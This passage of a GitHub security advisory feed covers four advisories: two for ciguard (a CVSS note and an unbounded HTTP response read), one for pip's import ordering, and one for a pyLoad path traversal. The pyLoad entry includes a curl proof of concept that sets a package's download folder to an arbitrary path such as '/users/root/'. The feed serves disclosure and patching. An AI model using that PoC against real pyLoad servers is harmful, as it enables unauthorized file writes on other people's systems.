<li>CVSS v4.0: <code>CVSS:4.0/AV:L/AC:H/AT:P/PR:H/UI:N/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N</code> — 3.4 (Low) per Cycle 1 report; GitHub's calc 1.8 (Low). Both Low.</li>
</ul>
<h2 id="verification">Verification</h2>
<pre><code>$ docker run --rm ghcr.io/jo-jo98/ciguard:v0.8.2 id
uid=999(ciguard) gid=999(ciguard) groups=999(ciguard)
</code></pre>
<h2 id="resources">Resources</h2>
<ul>
<li>Fix released in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">v0.8.2</a></li>
<li>CI regression gate added in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">v0.8.3</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-jrm4-4pcf-4763">https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-jrm4-4pcf-4763</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-jrm4-4pcf-4763">https://github.com/advisories/GHSA-jrm4-4pcf-4763</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrm4-4pcf-4763</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-05T22:18:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ciguard] ciguard: SCA HTTP client reads response body without size cap]]></title>
        <id>https://github.com/advisories/GHSA-xw8c-rrvx-f7xq</id>
        <link href="https://github.com/advisories/GHSA-xw8c-rrvx-f7xq"/>
        <updated>2026-05-05T22:17:44.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Both SCA HTTP clients (<code>src/ciguard/analyzer/sca/osv.py</code> and <code>src/ciguard/analyzer/sca/endoflife.py</code>) call <code>payload = json.loads(resp.read().decode('utf-8'))</code> without a maximum-bytes cap. A hostile or compromised endoflife.date / OSV.dev (or a successful TLS MITM) could return a multi-GB response, exhausting the ciguard process's memory.</p>
<h2 id="threat-scenario">Threat scenario</h2>
<p>ciguard process memory exhaustion → OOM kill or system swap thrash. Realistic when ciguard runs in CI with a limited memory budget (typical: 4-8 GB). No data integrity or confidentiality impact.</p>
<p><strong>Realism caveat:</strong> both URLs are hardcoded HTTPS, so this is a low-realism threat (HTTPS prevents MITM unless the attacker controls a trusted CA or hijacks DNS in a way that doesn't trigger cert validation). The unbounded read is structural defence-in-depth, not a directly exploitable bug today.</p>
<h2 id="patch">Patch</h2>
<ul>
<li>New <code>MAX_RESPONSE_BYTES = 5 * 1024 * 1024</code> (5 MB) constant in both modules.</li>
<li><code>body = resp.read(MAX_RESPONSE_BYTES + 1)</code> with overflow check returns <code>None</code> (caller falls back to stale cache).</li>
<li>3 regression tests in <code>tests/test_sca_rules.py::TestSCAResponseSizeCap</code>.</li>
</ul>
<h2 id="discovery">Discovery</h2>
<p>Found during ciguard's first self-conducted pentest cycle, 2026-04-26.</p>
<h2 id="cvss-scoring">CVSS Scoring</h2>
<ul>
<li>CVSS v3.1: <code>CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L</code> — 3.7 (Low)</li>
<li>CVSS v4.0: <code>CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N</code> — first.org calc 3.1 (Low); GitHub's calc 6.3 (Medium). Vector is correct — choosing v3.1 as the structured score keeps the consistent Low rating across consumers.</li>
</ul>
<h2 id="reproduction">Reproduction</h2>
<p>Monkey-patch <code>urllib.request.urlopen</code> to return a fake 50 MB response; observe memory growth before/after the call. Pre-fix: process memory grows by ~50 MB. Post-fix: <code>_fetch</code> returns <code>None</code>, memory growth bounded to MAX_RESPONSE_BYTES.</p>
<h2 id="resources">Resources</h2>
<ul>
<li>Fix released in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">v0.8.2</a></li>
<li>CI regression gate added in <a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">v0.8.3</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-xw8c-rrvx-f7xq">https://github.com/Jo-Jo98/ciguard/security/advisories/GHSA-xw8c-rrvx-f7xq</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.2</a></li>
<li><a href="https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3">https://github.com/Jo-Jo98/ciguard/releases/tag/v0.8.3</a></li>
<li><a href="https://github.com/advisories/GHSA-xw8c-rrvx-f7xq">https://github.com/advisories/GHSA-xw8c-rrvx-f7xq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xw8c-rrvx-f7xq</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-05-05T22:17:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pip] pip Vulnerable to Inclusion of Functionality from Untrusted Control Sphere]]></title>
        <id>https://github.com/advisories/GHSA-jp4c-xjxw-mgf9</id>
        <link href="https://github.com/advisories/GHSA-jp4c-xjxw-mgf9"/>
        <updated>2026-05-05T22:05:47.000Z</updated>
        <content type="html"><![CDATA[<p>pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-6357">https://nvd.nist.gov/vuln/detail/CVE-2026-6357</a></li>
<li><a href="https://github.com/pypa/pip/pull/13923">https://github.com/pypa/pip/pull/13923</a></li>
<li><a href="https://ichard26.github.io/blog/2026/04/whats-new-in-pip-26.1/#security-fixes">https://ichard26.github.io/blog/2026/04/whats-new-in-pip-26.1/#security-fixes</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/04/27/7">http://www.openwall.com/lists/oss-security/2026/04/27/7</a></li>
<li><a href="https://github.com/pypa/pip/commit/b369bfc96cc524e00c267e1693290e6599c36bad">https://github.com/pypa/pip/commit/b369bfc96cc524e00c267e1693290e6599c36bad</a></li>
<li><a href="https://github.com/advisories/GHSA-jp4c-xjxw-mgf9">https://github.com/advisories/GHSA-jp4c-xjxw-mgf9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jp4c-xjxw-mgf9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-27T15:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyload-ng] PyLoad vulnerable to Path Traversal via Package Folder Name in set_package_data]]></title>
        <id>https://github.com/advisories/GHSA-838g-gr43-qqg9</id>
        <link href="https://github.com/advisories/GHSA-838g-gr43-qqg9"/>
        <updated>2026-05-05T21:18:20.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>No sanitization of package folder name allows writing files anywhere outside the intended download directory.</p>
<h4 id="affected-component">Affected Component</h4>
<ul>
<li><code>src/pyload/core/api/__init__.py</code></li>
<li>Function: <code>set_package_data()</code></li>
</ul>
<h3 id="details">Details</h3>
<p>When passing a folder name in the <code>set_package_data()</code> API function call inside the data object with key <code>"_folder"</code>, there is no sanitization at all, allowing a user with <code>Perms.MODIFY</code> to specify arbitrary directories as download locations for a package.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Create a package, note response package ID e.g. <code>5</code></li>
</ol>
<pre><code>curl -X 'POST' \
  'http://localhost:8000/api/add_package' \
  -H 'accept: application/json' \
  -H 'X-API-Key: &lt;valid api key&gt;' \
  -H 'Content-Type: application/json' \
  -d '{
  "name": "set_package_data_exploit_poc",
  "links": [
    "http://example.com/file.txt"
  ],
  "dest": 1
}'
</code></pre>
<ol start="2">
<li>Call set_package_data for this package ID with an arbitrary directory</li>
</ol>
<pre><code>curl -X 'POST' \
  'http://localhost:8000/api/set_package_data' \
  -H 'accept: */*' \
  -H 'X-API-Key: &lt;valid api key&gt;' \
  -H 'Content-Type: application/json' \
  -d '{
  "package_id": 5,
  "data": {
    "_folder": "/users/root/"
  }
}'
</code></pre>
<ol start="3">
<li>New download folder will be set without any checks</li>
</ol>
<pre><code>curl -X 'GET' \
  'http://localhost:8000/api/get_queue' \
  -H 'accept: application/json' \
  -H 'X-API-Key: &lt;valid api key&gt;'
</code></pre>
<p>Response:</p>
<pre><code>[
  {
    "pid": 5,
    "name": "set_package_data_exploit_poc",
    "folder": "/users/root/",
    "site": "",
    "password": "",
    "dest": 1,
    "order": 1,
    "linksdone": 0,
    "sizedone": 0,
    "sizetotal": 0,
    "linkstotal": 1,
    "links": null,
    "fids": null
  }
]
</code></pre>
<h3 id="impact">Impact</h3>
<p>Allows Absolute Path Traversal to write in an arbitrary directory as long as the pyLoad process has write access.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pyload/pyload/security/advisories/GHSA-838g-gr43-qqg9">https://github.com/pyload/pyload/security/advisories/GHSA-838g-gr43-qqg9</a></li>
<li><a href="https://github.com/advisories/GHSA-838g-gr43-qqg9">https://github.com/advisories/GHSA-838g-gr43-qqg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-838g-gr43-qqg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-05-05T21:18:19.000Z</published>
    </entry>
</feed>